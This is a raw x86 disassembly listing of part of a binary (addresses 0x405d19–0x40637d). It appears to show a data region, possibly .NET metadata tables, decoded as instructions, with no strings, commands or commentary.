  405d19:	00 a0 00 00 01 00    	add    %ah,0x10000(%eax)
  405d1f:	00 26                	add    %ah,(%esi)
  405d21:	23 00                	and    (%eax),%eax
  405d23:	00 05 00 44 00 a2    	add    %al,0xa2004400
  405d29:	00 13                	add    %dl,(%ebx)
  405d2b:	01 00                	add    %eax,(%eax)
  405d2d:	00 44 02 00          	add    %al,0x0(%edx,%eax,1)
  405d31:	00 61 00             	add    %ah,0x0(%ecx)
  405d34:	46                   	inc    %esi
  405d35:	00 a2 00 13 01 00    	add    %ah,0x11300(%edx)
  405d3b:	00 22                	add    %ah,(%edx)
  405d3d:	06                   	push   %es
  405d3e:	00 00                	add    %al,(%eax)
  405d40:	61                   	popa
  405d41:	00 46 00             	add    %al,0x0(%esi)
  405d44:	a2 00 16 00 90       	mov    %al,0x90001600
  405d49:	09 12                	or     %edx,(%edx)
  405d4b:	00 16                	add    %dl,(%esi)
  405d4d:	00 f6                	add    %dh,%dh
  405d4f:	04 12                	add    $0x12,%al
  405d51:	00 16                	add    %dl,(%esi)
  405d53:	00 22                	add    %ah,(%edx)
  405d55:	24 12                	and    $0x12,%al
  405d57:	00 16                	add    %dl,(%esi)
  405d59:	00 f5                	add    %dh,%ch
  405d5b:	01 12                	add    %edx,(%edx)
  405d5d:	00 16                	add    %dl,(%esi)
  405d5f:	00 65 24             	add    %ah,0x24(%ebp)
  405d62:	12 00                	adc    (%eax),%al
  405d64:	16                   	push   %ss
  405d65:	00 b2 08 12 00 16    	add    %dh,0x16001208(%edx)
  405d6b:	00 87 07 12 00 16    	add    %al,0x16001207(%edi)
  405d71:	00 8f 14 12 00 16    	add    %cl,0x16001214(%edi)
  405d77:	00 7d 04             	add    %bh,0x4(%ebp)
  405d7a:	12 00                	adc    (%eax),%al
  405d7c:	16                   	push   %ss
  405d7d:	00 d8                	add    %bl,%al
  405d7f:	23 12                	and    (%edx),%edx
  405d81:	00 16                	add    %dl,(%esi)
  405d83:	00 9e 03 15 00 16    	add    %bl,0x16001503(%esi)
  405d89:	00 6a 06             	add    %ch,0x6(%edx)
  405d8c:	12 00                	adc    (%eax),%al
  405d8e:	16                   	push   %ss
  405d8f:	00 de                	add    %bl,%dh
  405d91:	00 19                	add    %bl,(%ecx)
  405d93:	00 16                	add    %dl,(%esi)
  405d95:	00 7a 23             	add    %bh,0x23(%edx)
  405d98:	12 00                	adc    (%eax),%al
  405d9a:	16                   	push   %ss
  405d9b:	00 5d 02             	add    %bl,0x2(%ebp)
  405d9e:	12 00                	adc    (%eax),%al
  405da0:	16                   	push   %ss
  405da1:	00 bd 08 12 00 16    	add    %bh,0x16001208(%ebp)
  405da7:	00 18                	add    %bl,(%eax)
  405da9:	26 12 00             	adc    %es:(%eax),%al
  405dac:	11 00                	adc    %eax,(%eax)
  405dae:	36 0d 21 00 11 00    	ss or  $0x110021,%eax
  405db4:	1b 0d 25 00 11 00    	sbb    0x110025,%ecx
  405dba:	eb 0c                	jmp    0x405dc8
  405dbc:	29 00                	sub    %eax,(%eax)
  405dbe:	11 00                	adc    %eax,(%eax)
  405dc0:	9f                   	lahf
  405dc1:	0c 2d                	or     $0x2d,%al
  405dc3:	00 11                	add    %dl,(%ecx)
  405dc5:	00 03                	add    %al,(%ebx)
  405dc7:	0d 2d 00 11 00       	or     $0x11002d,%eax
  405dcc:	84 0c 30             	test   %cl,(%eax,%esi,1)
  405dcf:	00 11                	add    %dl,(%ecx)
  405dd1:	00 67 0c             	add    %ah,0xc(%edi)
  405dd4:	34 00                	xor    $0x0,%al
  405dd6:	31 00                	xor    %eax,(%eax)
  405dd8:	4d                   	dec    %ebp
  405dd9:	0c 37                	or     $0x37,%al
  405ddb:	00 11                	add    %dl,(%ecx)
  405ddd:	00 bb 0c 30 00 11    	add    %bh,0x1100300c(%ebx)
  405de3:	00 d1                	add    %dl,%cl
  405de5:	0c 3a                	or     $0x3a,%al
  405de7:	00 11                	add    %dl,(%ecx)
  405de9:	00 e4                	add    %ah,%ah
  405deb:	22 c3                	and    %bl,%al
  405ded:	00 01                	add    %al,(%ecx)
  405def:	00 66 03             	add    %ah,0x3(%esi)
  405df2:	f2 00 01             	repnz add %al,(%ecx)
  405df5:	00 41 18             	add    %al,0x18(%ecx)
  405df8:	3a 00                	cmp    (%eax),%al
  405dfa:	01 00                	add    %eax,(%eax)
  405dfc:	66 03 f2             	add    %dx,%si
  405dff:	00 01                	add    %al,(%ecx)
  405e01:	00 3a                	add    %bh,(%edx)
  405e03:	01 10                	add    %edx,(%eax)
  405e05:	01 01                	add    %eax,(%ecx)
  405e07:	00 e1                	add    %ah,%cl
  405e09:	15 12 00 01 00       	adc    $0x10012,%eax
  405e0e:	38 03                	cmp    %al,(%ebx)
  405e10:	12 00                	adc    (%eax),%al
  405e12:	01 00                	add    %eax,(%eax)
  405e14:	c9                   	leave
  405e15:	24 37                	and    $0x37,%al
  405e17:	00 01                	add    %al,(%ecx)
  405e19:	00 f7                	add    %dh,%bh
  405e1b:	03 4b 01             	add    0x1(%ebx),%ecx
  405e1e:	01 00                	add    %eax,(%eax)
  405e20:	54                   	push   %esp
  405e21:	04 10                	add    $0x10,%al
  405e23:	01 01                	add    %eax,(%ecx)
  405e25:	00 66 03             	add    %ah,0x3(%esi)
  405e28:	f2 00 01             	repnz add %al,(%ecx)
  405e2b:	00 20                	add    %ah,(%eax)
  405e2d:	01 4f 01             	add    %ecx,0x1(%edi)
  405e30:	06                   	push   %es
  405e31:	06                   	push   %es
  405e32:	2b 0a                	sub    (%edx),%ecx
  405e34:	3a 00                	cmp    (%eax),%al
  405e36:	56                   	push   %esi
  405e37:	80 53 23 4b          	adcb   $0x4b,0x23(%ebx)
  405e3b:	01 56 80             	add    %edx,-0x80(%esi)
  405e3e:	d0 19                	rcrb   $1,(%ecx)
  405e40:	4b                   	dec    %ebx
  405e41:	01 56 80             	add    %edx,-0x80(%esi)
  405e44:	f2 22 4b 01          	repnz and 0x1(%ebx),%cl
  405e48:	56                   	push   %esi
  405e49:	80 c1 04             	add    $0x4,%cl
  405e4c:	4b                   	dec    %ebx
  405e4d:	01 56 80             	add    %edx,-0x80(%esi)
  405e50:	58                   	pop    %eax
  405e51:	13 4b 01             	adc    0x1(%ebx),%ecx
  405e54:	56                   	push   %esi
  405e55:	80 11 04             	adcb   $0x4,(%ecx)
  405e58:	4b                   	dec    %ebx
  405e59:	01 56 80             	add    %edx,-0x80(%esi)
  405e5c:	74 05                	je     0x405e63
  405e5e:	4b                   	dec    %ebx
  405e5f:	01 56 80             	add    %edx,-0x80(%esi)
  405e62:	f0 15 4b 01 56 80    	lock adc $0x8056014b,%eax
  405e68:	f6 00 4b             	testb  $0x4b,(%eax)
  405e6b:	01 56 80             	add    %edx,-0x80(%esi)
  405e6e:	4a                   	dec    %edx
  405e6f:	1b 4b 01             	sbb    0x1(%ebx),%ecx
  405e72:	56                   	push   %esi
  405e73:	80 74 03 4b 01       	xorb   $0x1,0x4b(%ebx,%eax,1)
  405e78:	56                   	push   %esi
  405e79:	80 67 08 4b          	andb   $0x4b,0x8(%edi)
  405e7d:	01 06                	add    %eax,(%esi)
  405e7f:	06                   	push   %es
  405e80:	2b 0a                	sub    (%edx),%ecx
  405e82:	87 02                	xchg   %eax,(%edx)
  405e84:	56                   	push   %esi
  405e85:	80 84 01 8a 02 56 80 	addb   $0xd,-0x7fa9fd76(%ecx,%eax,1)
  405e8c:	0d 
  405e8d:	18 8a 02 56 80 a4    	sbb    %cl,-0x5b7fa9fe(%edx)
  405e93:	1d 8a 02 16 00       	sbb    $0x16028a,%eax
  405e98:	d2 00                	rolb   %cl,(%eax)
  405e9a:	93                   	xchg   %eax,%ebx
  405e9b:	02 31                	add    (%ecx),%dh
  405e9d:	00 fd                	add    %bh,%ch
  405e9f:	14 12                	adc    $0x12,%al
  405ea1:	00 16                	add    %dl,(%esi)
  405ea3:	00 4f 0a             	add    %cl,0xa(%edi)
  405ea6:	f2 00 16             	repnz add %dl,(%esi)
  405ea9:	00 2d 1b b6 02 51    	add    %ch,0x5102b61b
  405eaf:	80 18 09             	sbbb   $0x9,(%eax)
  405eb2:	3a 00                	cmp    (%eax),%al
  405eb4:	51                   	push   %ecx
  405eb5:	80 68 07 3a          	subb   $0x3a,0x7(%eax)
  405eb9:	00 51 80             	add    %dl,-0x80(%ecx)
  405ebc:	ad                   	lods   %ds:(%esi),%eax
  405ebd:	03 3a                	add    (%edx),%edi
  405ebf:	00 51 80             	add    %dl,-0x80(%ecx)
  405ec2:	a1 23 3a 00 21       	mov    0x21003a23,%eax
  405ec7:	00 1e                	add    %bl,(%esi)
  405ec9:	1a 29                	sbb    (%ecx),%ch
  405ecb:	00 21                	add    %ah,(%ecx)
  405ecd:	00 fe                	add    %bh,%dh
  405ecf:	06                   	push   %es
  405ed0:	29 00                	sub    %eax,(%eax)
  405ed2:	31 00                	xor    %eax,(%eax)
  405ed4:	ba 03 29 00 33       	mov    $0x33002903,%edx
  405ed9:	01 19                	add    %ebx,(%ecx)
  405edb:	18 f2                	sbb    %dh,%dl
  405edd:	02 33                	add    (%ebx),%dh
  405edf:	01 75 0a             	add    %esi,0xa(%ebp)
  405ee2:	f6 02 20             	testb  $0x20,(%edx)
  405ee5:	26 00 00             	add    %al,%es:(%eax)
  405ee8:	00 00                	add    %al,(%eax)
  405eea:	96                   	xchg   %eax,%esi
  405eeb:	00 84 18 0a 00 01 00 	add    %al,0x1000a(%eax,%ebx,1)
  405ef2:	78 20                	js     0x405f14
  405ef4:	00 00                	add    %al,(%eax)
  405ef6:	00 00                	add    %al,(%eax)
  405ef8:	86 18                	xchg   %bl,(%eax)
  405efa:	34 1d                	xor    $0x1d,%al
  405efc:	0e                   	push   %cs
  405efd:	00 01                	add    %al,(%ecx)
  405eff:	00 f4                	add    %dh,%ah
  405f01:	26 00 00             	add    %al,%es:(%eax)
  405f04:	00 00                	add    %al,(%eax)
  405f06:	96                   	xchg   %eax,%esi
  405f07:	00 97 04 1d 00 01    	add    %dl,0x1001d04(%edi)
  405f0d:	00 30                	add    %dh,(%eax)
  405f0f:	28 00                	sub    %al,(%eax)
  405f11:	00 00                	add    %al,(%eax)
  405f13:	00 91 00 9e 01 1d    	add    %dl,0x1d019e00(%ecx)
  405f19:	00 01                	add    %al,(%ecx)
  405f1b:	00 98 28 00 00 00    	add    %bl,0x28(%eax)
  405f21:	00 91 18 3a 1d 0a    	add    %dl,0xa1d3a18(%ecx)
  405f27:	00 01                	add    %al,(%ecx)
  405f29:	00 80 20 00 00 00    	add    %al,0x20(%eax)
  405f2f:	00 96 08 6a 21 3d    	add    %dl,0x3d216a08(%esi)
  405f35:	00 01                	add    %al,(%ecx)
  405f37:	00 87 20 00 00 00    	add    %al,0x20(%edi)
  405f3d:	00 96 08 78 21 42    	add    %dl,0x42217808(%esi)
  405f43:	00 01                	add    %al,(%ecx)
  405f45:	00 8f 20 00 00 00    	add    %cl,0x20(%edi)
  405f4b:	00 96 08 4e 21 48    	add    %dl,0x48214e08(%esi)
  405f51:	00 02                	add    %al,(%edx)
  405f53:	00 96 20 00 00 00    	add    %dl,0x20(%esi)
  405f59:	00 96 08 5c 21 4d    	add    %dl,0x4d215c08(%esi)
  405f5f:	00 02                	add    %al,(%edx)
  405f61:	00 9e 20 00 00 00    	add    %bl,0x20(%esi)
  405f67:	00 91 08 24 1c 53    	add    %dl,0x531c2408(%ecx)
  405f6d:	00 03                	add    %al,(%ebx)
  405f6f:	00 a5 20 00 00 00    	add    %ah,0x20(%ebp)
  405f75:	00 91 08 2f 1c 58    	add    %dl,0x581c2f08(%ecx)
  405f7b:	00 03                	add    %al,(%ebx)
  405f7d:	00 ad 20 00 00 00    	add    %ch,0x20(%ebp)
  405f83:	00 91 08 8a 12 5e    	add    %dl,0x5e128a08(%ecx)
  405f89:	00 04 00             	add    %al,(%eax,%eax,1)
  405f8c:	b4 20                	mov    $0x20,%ah
  405f8e:	00 00                	add    %al,(%eax)
  405f90:	00 00                	add    %al,(%eax)
  405f92:	91                   	xchg   %eax,%ecx
  405f93:	08 99 12 62 00 04    	or     %bl,0x4006212(%ecx)
  405f99:	00 bc 20 00 00 00 00 	add    %bh,0x0(%eax,%eiz,1)
  405fa0:	91                   	xchg   %eax,%ecx
  405fa1:	08 f5                	or     %dh,%ch
  405fa3:	20 5e 00             	and    %bl,0x0(%esi)
  405fa6:	05 00 c3 20 00       	add    $0x20c300,%eax
  405fab:	00 00                	add    %al,(%eax)
  405fad:	00 91 08 00 21 62    	add    %dl,0x62210008(%ecx)
  405fb3:	00 05 00 cb 20 00    	add    %al,0x20cb00
  405fb9:	00 00                	add    %al,(%eax)
  405fbb:	00 91 08 3e 12 67    	add    %dl,0x67123e08(%ecx)
  405fc1:	00 06                	add    %al,(%esi)
  405fc3:	00 d2                	add    %dl,%dl
  405fc5:	20 00                	and    %al,(%eax)
  405fc7:	00 00                	add    %al,(%eax)
  405fc9:	00 91 08 4c 12 6c    	add    %dl,0x6c124c08(%ecx)
  405fcf:	00 06                	add    %al,(%esi)
  405fd1:	00 da                	add    %bl,%dl
  405fd3:	20 00                	and    %al,(%eax)
  405fd5:	00 00                	add    %al,(%eax)
  405fd7:	00 96 08 16 0c 1d    	add    %dl,0x1d0c1608(%esi)
  405fdd:	00 07                	add    %al,(%edi)
  405fdf:	00 e1                	add    %ah,%cl
  405fe1:	20 00                	and    %al,(%eax)
  405fe3:	00 00                	add    %al,(%eax)
  405fe5:	00 96 08 26 0c 72    	add    %dl,0x720c2608(%esi)
  405feb:	00 07                	add    %al,(%edi)
  405fed:	00 e9                	add    %ch,%cl
  405fef:	20 00                	and    %al,(%eax)
  405ff1:	00 00                	add    %al,(%eax)
  405ff3:	00 91 08 66 0b 77    	add    %dl,0x770b6608(%ecx)
  405ff9:	00 08                	add    %cl,(%eax)
  405ffb:	00 f0                	add    %dh,%al
  405ffd:	20 00                	and    %al,(%eax)
  405fff:	00 00                	add    %al,(%eax)
  406001:	00 91 08 65 13 67    	add    %dl,0x67136508(%ecx)
  406007:	00 08                	add    %cl,(%eax)
  406009:	00 f7                	add    %dh,%bh
  40600b:	20 00                	and    %al,(%eax)
  40600d:	00 00                	add    %al,(%eax)
  40600f:	00 91 08 6e 13 6c    	add    %dl,0x6c136e08(%ecx)
  406015:	00 08                	add    %cl,(%eax)
  406017:	00 ff                	add    %bh,%bh
  406019:	20 00                	and    %al,(%eax)
  40601b:	00 00                	add    %al,(%eax)
  40601d:	00 96 08 8e 16 7b    	add    %dl,0x7b168e08(%esi)
  406023:	00 09                	add    %cl,(%ecx)
  406025:	00 06                	add    %al,(%esi)
  406027:	21 00                	and    %eax,(%eax)
  406029:	00 00                	add    %al,(%eax)
  40602b:	00 96 08 9b 16 7f    	add    %dl,0x7f169b08(%esi)
  406031:	00 09                	add    %cl,(%ecx)
  406033:	00 3c 29             	add    %bh,(%ecx,%ebp,1)
  406036:	00 00                	add    %al,(%eax)
  406038:	00 00                	add    %al,(%eax)
  40603a:	96                   	xchg   %eax,%esi
  40603b:	00 9c 00 0a 00 0a 00 	add    %bl,0xa000a(%eax,%eax,1)
  406042:	0e                   	push   %cs
  406043:	21 00                	and    %eax,(%eax)
  406045:	00 00                	add    %al,(%eax)
  406047:	00 91 00 c5 00 84    	add    %dl,-0x7bff3b00(%ecx)
  40604d:	00 0a                	add    %cl,(%edx)
  40604f:	00 19                	add    %bl,(%ecx)
  406051:	21 00                	and    %eax,(%eax)
  406053:	00 00                	add    %al,(%eax)
  406055:	00 91 00 b9 09 89    	add    %dl,-0x76f64700(%ecx)
  40605b:	00 0b                	add    %cl,(%ebx)
  40605d:	00 34 2c             	add    %dh,(%esp,%ebp,1)
  406060:	00 00                	add    %al,(%eax)
  406062:	00 00                	add    %al,(%eax)
  406064:	96                   	xchg   %eax,%esi
  406065:	00 e7                	add    %ah,%bh
  406067:	08 0a                	or     %cl,(%edx)
  406069:	00 0f                	add    %cl,(%edi)
  40606b:	00 98 2c 00 00 00    	add    %bl,0x2c(%eax)
  406071:	00 96 00 6d 02 94    	add    %dl,-0x6bfd9300(%esi)
  406077:	00 0f                	add    %cl,(%edi)
  406079:	00 58 2e             	add    %bl,0x2e(%eax)
  40607c:	00 00                	add    %al,(%eax)
  40607e:	00 00                	add    %al,(%eax)
  406080:	96                   	xchg   %eax,%esi
  406081:	00 2c 01             	add    %ch,(%ecx,%eax,1)
  406084:	58                   	pop    %eax
  406085:	00 10                	add    %dl,(%eax)
  406087:	00 74 2f 00          	add    %dh,0x0(%edi,%ebp,1)
  40608b:	00 00                	add    %al,(%eax)
  40608d:	00 96 00 e2 16 9a    	add    %dl,-0x65e91e00(%esi)
  406093:	00 11                	add    %dl,(%ecx)
  406095:	00 26                	add    %ah,(%esi)
  406097:	21 00                	and    %eax,(%eax)
  406099:	00 00                	add    %al,(%eax)
  40609b:	00 91 00 c5 03 9a    	add    %dl,-0x65fc3b00(%ecx)
  4060a1:	00 12                	add    %dl,(%edx)
  4060a3:	00 34 21             	add    %dh,(%ecx,%eiz,1)
  4060a6:	00 00                	add    %al,(%eax)
  4060a8:	00 00                	add    %al,(%eax)
  4060aa:	91                   	xchg   %eax,%ecx
  4060ab:	18 3a                	sbb    %bh,(%edx)
  4060ad:	1d 0a 00 13 00       	sbb    $0x13000a,%eax
  4060b2:	40                   	inc    %eax
  4060b3:	21 00                	and    %eax,(%eax)
  4060b5:	00 00                	add    %al,(%eax)
  4060b7:	00 96 00 a7 0a c7    	add    %dl,-0x38f55900(%esi)
  4060bd:	00 13                	add    %dl,(%ebx)
  4060bf:	00 4d 21             	add    %cl,0x21(%ebp)
  4060c2:	00 00                	add    %al,(%eax)
  4060c4:	00 00                	add    %al,(%eax)
  4060c6:	96                   	xchg   %eax,%esi
  4060c7:	00 95 08 cd 00 14    	add    %dl,0x1400cd08(%ebp)
  4060cd:	00 08                	add    %cl,(%eax)
  4060cf:	30 00                	xor    %al,(%eax)
  4060d1:	00 00                	add    %al,(%eax)
  4060d3:	00 96 00 0c 07 cd    	add    %dl,-0x32f8f400(%esi)
  4060d9:	00 15 00 4c 30 00    	add    %dl,0x304c00
  4060df:	00 00                	add    %al,(%eax)
  4060e1:	00 96 00 28 07 cd    	add    %dl,-0x32f8d800(%esi)
  4060e7:	00 16                	add    %dl,(%esi)
  4060e9:	00 90 30 00 00 00    	add    %dl,0x30(%eax)
  4060ef:	00 96 00 db 04 d3    	add    %dl,-0x2cfb2500(%esi)
  4060f5:	00 17                	add    %dl,(%edi)
  4060f7:	00 5a 21             	add    %bl,0x21(%edx)
  4060fa:	00 00                	add    %al,(%eax)
  4060fc:	00 00                	add    %al,(%eax)
  4060fe:	96                   	xchg   %eax,%esi
  4060ff:	00 ea                	add    %ch,%dl
  406101:	01 da                	add    %ebx,%edx
  406103:	00 18                	add    %bl,(%eax)
  406105:	00 67 21             	add    %ah,0x21(%edi)
  406108:	00 00                	add    %al,(%eax)
  40610a:	00 00                	add    %al,(%eax)
  40610c:	96                   	xchg   %eax,%esi
  40610d:	00 93 23 e0 00 19    	add    %dl,0x1900e023(%ebx)
  406113:	00 8b 21 00 00 00    	add    %cl,0x21(%ebx)
  406119:	00 96 00 eb 19 e6    	add    %dl,-0x19e61500(%esi)
  40611f:	00 1a                	add    %bl,(%edx)
  406121:	00 9f 21 00 00 00    	add    %bl,0x21(%edi)
  406127:	00 96 00 03 05 ec    	add    %dl,-0x13fafd00(%esi)
  40612d:	00 1b                	add    %bl,(%ebx)
  40612f:	00 78 20             	add    %bh,0x20(%eax)
  406132:	00 00                	add    %al,(%eax)
  406134:	00 00                	add    %al,(%eax)
  406136:	86 18                	xchg   %bl,(%eax)
  406138:	34 1d                	xor    $0x1d,%al
  40613a:	0e                   	push   %cs
  40613b:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40613e:	ac                   	lods   %ds:(%esi),%al
  40613f:	21 00                	and    %eax,(%eax)
  406141:	00 00                	add    %al,(%eax)
  406143:	00 91 18 3a 1d 0a    	add    %dl,0xa1d3a18(%ecx)
  406149:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40614c:	b8 21 00 00 00       	mov    $0x21,%eax
  406151:	00 86 18 34 1d fa    	add    %al,-0x5e2cbe8(%esi)
  406157:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40615a:	ce                   	into
  40615b:	21 00                	and    %eax,(%eax)
  40615d:	00 00                	add    %al,(%eax)
  40615f:	00 e1                	add    %ah,%cl
  406161:	09 b9 21 04 01 1d    	or     %edi,0x1d010421(%ecx)
  406167:	00 e1                	add    %ah,%cl
  406169:	21 00                	and    %eax,(%eax)
  40616b:	00 00                	add    %al,(%eax)
  40616d:	00 e1                	add    %ah,%cl
  40616f:	01 a0 22 08 01 1d    	add    %esp,0x1d010822(%eax)
  406175:	00 04 22             	add    %al,(%edx,%eiz,1)
  406178:	00 00                	add    %al,(%eax)
  40617a:	00 00                	add    %al,(%eax)
  40617c:	e1 01                	loope  0x40617f
  40617e:	d0 20                	shlb   $1,(%eax)
  406180:	0e                   	push   %cs
  406181:	00 1d 00 0d 22 00    	add    %bl,0x220d00
  406187:	00 00                	add    %al,(%eax)
  406189:	00 86 18 34 1d 14    	add    %al,0x141d3418(%esi)
  40618f:	01 1d 00 23 22 00    	add    %ebx,0x222300
  406195:	00 00                	add    %al,(%eax)
  406197:	00 86 00 18 08 20    	add    %al,0x20081800(%esi)
  40619d:	01 1f                	add    %ebx,(%edi)
  40619f:	00 30                	add    %dh,(%eax)
  4061a1:	22 00                	and    (%eax),%al
  4061a3:	00 00                	add    %al,(%eax)
  4061a5:	00 86 00 5e 18 25    	add    %al,0x25185e00(%esi)
  4061ab:	01 1f                	add    %ebx,(%edi)
  4061ad:	00 44 22 00          	add    %al,0x0(%edx,%eiz,1)
  4061b1:	00 00                	add    %al,(%eax)
  4061b3:	00 86 00 28 03 2b    	add    %al,0x2b032800(%esi)
  4061b9:	01 20                	add    %esp,(%eax)
  4061bb:	00 58 22             	add    %bl,0x22(%eax)
  4061be:	00 00                	add    %al,(%eax)
  4061c0:	00 00                	add    %al,(%eax)
  4061c2:	86 00                	xchg   %al,(%eax)
  4061c4:	27                   	daa
  4061c5:	15 31 01 21 00       	adc    $0x210131,%eax
  4061ca:	6c                   	insb   (%dx),%es:(%edi)
  4061cb:	22 00                	and    (%eax),%al
  4061cd:	00 00                	add    %al,(%eax)
  4061cf:	00 86 08 66 17 37    	add    %al,0x37176608(%esi)
  4061d5:	01 22                	add    %esp,(%edx)
  4061d7:	00 7a 22             	add    %bh,0x22(%edx)
  4061da:	00 00                	add    %al,(%eax)
  4061dc:	00 00                	add    %al,(%eax)
  4061de:	86 08                	xchg   %cl,(%eax)
  4061e0:	e6 14                	out    %al,$0x14
  4061e2:	3d 01 23 00 87       	cmp    $0x87002301,%eax
  4061e7:	22 00                	and    (%eax),%al
  4061e9:	00 00                	add    %al,(%eax)
  4061eb:	00 81 00 01 03 53    	add    %al,0x53030100(%ecx)
  4061f1:	01 23                	add    %esp,(%ebx)
  4061f3:	00 c8                	add    %cl,%al
  4061f5:	30 00                	xor    %al,(%eax)
  4061f7:	00 00                	add    %al,(%eax)
  4061f9:	00 81 00 e8 04 0e    	add    %al,0xe04e800(%ecx)
  4061ff:	00 24 00             	add    %ah,(%eax,%eax,1)
  406202:	08 31                	or     %dh,(%ecx)
  406204:	00 00                	add    %al,(%eax)
  406206:	00 00                	add    %al,(%eax)
  406208:	81 00 26 0b 20 01    	addl   $0x1200b26,(%eax)
  40620e:	24 00                	and    $0x0,%al
  406210:	30 31                	xor    %dh,(%ecx)
  406212:	00 00                	add    %al,(%eax)
  406214:	00 00                	add    %al,(%eax)
  406216:	81 00 b1 04 58 01    	addl   $0x15804b1,(%eax)
  40621c:	24 00                	and    $0x0,%al
  40621e:	a0 31 00 00 00       	mov    0x31,%al
  406223:	00 86 00 74 01 25    	add    %al,0x25017400(%esi)
  406229:	01 25 00 a1 22 00    	add    %esp,0x22a100
  40622f:	00 00                	add    %al,(%eax)
  406231:	00 81 00 79 24 20    	add    %al,0x20247900(%ecx)
  406237:	01 26                	add    %esp,(%esi)
  406239:	00 bf 22 00 00 00    	add    %bh,0x22(%edi)
  40623f:	00 81 00 04 01 20    	add    %al,0x20010400(%ecx)
  406245:	01 26                	add    %esp,(%esi)
  406247:	00 dd                	add    %bl,%ch
  406249:	22 00                	and    (%eax),%al
  40624b:	00 00                	add    %al,(%eax)
  40624d:	00 86 00 2e 04 20    	add    %al,0x20042e00(%esi)
  406253:	01 26                	add    %esp,(%esi)
  406255:	00 c8                	add    %cl,%al
  406257:	31 00                	xor    %eax,(%eax)
  406259:	00 00                	add    %al,(%eax)
  40625b:	00 81 00 62 04 5d    	add    %al,0x5d046200(%ecx)
  406261:	01 26                	add    %esp,(%esi)
  406263:	00 84 32 00 00 00 00 	add    %al,0x0(%edx,%esi,1)
  40626a:	81 00 5c 06 5d 01    	addl   $0x15d065c,(%eax)
  406270:	27                   	daa
  406271:	00 e5                	add    %ah,%ch
  406273:	22 00                	and    (%eax),%al
  406275:	00 00                	add    %al,(%eax)
  406277:	00 86 00 86 23 63    	add    %al,0x63238600(%esi)
  40627d:	01 28                	add    %ebp,(%eax)
  40627f:	00 fa                	add    %bh,%dl
  406281:	22 00                	and    (%eax),%al
  406283:	00 00                	add    %al,(%eax)
  406285:	00 86 00 15 24 68    	add    %al,0x68241500(%esi)
  40628b:	01 29                	add    %ebp,(%ecx)
  40628d:	00 28                	add    %ch,(%eax)
  40628f:	33 00                	xor    (%eax),%eax
  406291:	00 00                	add    %al,(%eax)
  406293:	00 86 00 f3 08 6d    	add    %al,0x6d08f300(%esi)
  406299:	01 2a                	add    %ebp,(%edx)
  40629b:	00 cc                	add    %cl,%ah
  40629d:	33 00                	xor    (%eax),%eax
  40629f:	00 00                	add    %al,(%eax)
  4062a1:	00 86 00 2b 02 71    	add    %al,0x71022b00(%esi)
  4062a7:	01 2a                	add    %ebp,(%edx)
  4062a9:	00 70 34             	add    %dh,0x34(%eax)
  4062ac:	00 00                	add    %al,(%eax)
  4062ae:	00 00                	add    %al,(%eax)
  4062b0:	86 00                	xchg   %al,(%eax)
  4062b2:	44                   	inc    %esp
  4062b3:	07                   	pop    %es
  4062b4:	75 01                	jne    0x4062b7
  4062b6:	2a 00                	sub    (%eax),%al
  4062b8:	0f 23 00             	mov    %eax,%db0
  4062bb:	00 00                	add    %al,(%eax)
  4062bd:	00 86 00 03 02 79    	add    %al,0x79020300(%esi)
  4062c3:	01 2a                	add    %ebp,(%edx)
  4062c5:	00 00                	add    %al,(%eax)
  4062c7:	35 00 00 00 00       	xor    $0x0,%eax
  4062cc:	86 00                	xchg   %al,(%eax)
  4062ce:	27                   	daa
  4062cf:	26 7f 01             	es jg  0x4062d3
  4062d2:	2b 00                	sub    (%eax),%eax
  4062d4:	20 23                	and    %ah,(%ebx)
  4062d6:	00 00                	add    %al,(%eax)
  4062d8:	00 00                	add    %al,(%eax)
  4062da:	86 00                	xchg   %al,(%eax)
  4062dc:	e7 02                	out    %eax,$0x2
  4062de:	84 01                	test   %al,(%ecx)
  4062e0:	2b 00                	sub    (%eax),%eax
  4062e2:	35 23 00 00 00       	xor    $0x23,%eax
  4062e7:	00 86 00 c2 18 8a    	add    %al,-0x75e73e00(%esi)
  4062ed:	01 2d 00 b0 35 00    	add    %ebp,0x35b000
  4062f3:	00 00                	add    %al,(%eax)
  4062f5:	00 86 00 30 06 90    	add    %al,-0x6ff9d000(%esi)
  4062fb:	01 2f                	add    %ebp,(%edi)
  4062fd:	00 4b 23             	add    %cl,0x23(%ebx)
  406300:	00 00                	add    %al,(%eax)
  406302:	00 00                	add    %al,(%eax)
  406304:	86 00                	xchg   %al,(%eax)
  406306:	76 09                	jbe    0x406311
  406308:	90                   	nop
  406309:	01 30                	add    %esi,(%eax)
  40630b:	00 04 36             	add    %al,(%esi,%esi,1)
  40630e:	00 00                	add    %al,(%eax)
  406310:	00 00                	add    %al,(%eax)
  406312:	86 00                	xchg   %al,(%eax)
  406314:	7a 02                	jp     0x406318
  406316:	25 01 31 00 89       	and    $0x89003101,%eax
  40631b:	23 00                	and    (%eax),%eax
  40631d:	00 00                	add    %al,(%eax)
  40631f:	00 86 00 f7 1a 0e    	add    %al,0xe1af700(%esi)
  406325:	00 32                	add    %dh,(%edx)
  406327:	00 9f 23 00 00 00    	add    %bl,0x23(%edi)
  40632d:	00 86 00 69 1d 53    	add    %al,0x531d6900(%esi)
  406333:	01 32                	add    %esi,(%edx)
  406335:	00 af 23 00 00 00    	add    %ch,0x23(%edi)
  40633b:	00 86 00 1d 16 95    	add    %al,-0x6ae9e300(%esi)
  406341:	01 33                	add    %esi,(%ebx)
  406343:	00 ca                	add    %cl,%dl
  406345:	23 00                	and    (%eax),%eax
  406347:	00 00                	add    %al,(%eax)
  406349:	00 86 00 c7 09 99    	add    %al,-0x66f63900(%esi)
  40634f:	01 33                	add    %esi,(%ebx)
  406351:	00 df                	add    %bl,%bh
  406353:	23 00                	and    (%eax),%eax
  406355:	00 00                	add    %al,(%eax)
  406357:	00 86 00 b1 06 9e    	add    %al,-0x61f94f00(%esi)
  40635d:	01 34 00             	add    %esi,(%eax,%eax,1)
  406360:	f5                   	cmc
  406361:	23 00                	and    (%eax),%eax
  406363:	00 00                	add    %al,(%eax)
  406365:	00 86 00 c9 16 a3    	add    %al,-0x5ce93700(%esi)
  40636b:	01 35 00 a8 36 00    	add    %esi,0x36a800
  406371:	00 00                	add    %al,(%eax)
  406373:	00 86 00 ef 17 79    	add    %al,0x7917ef00(%esi)
  406379:	01 36                	add    %esi,(%esi)
  40637b:	00 fc                	add    %bh,%ah
  40637d:	36 00 00             	add    %al,%ss:(%eax)
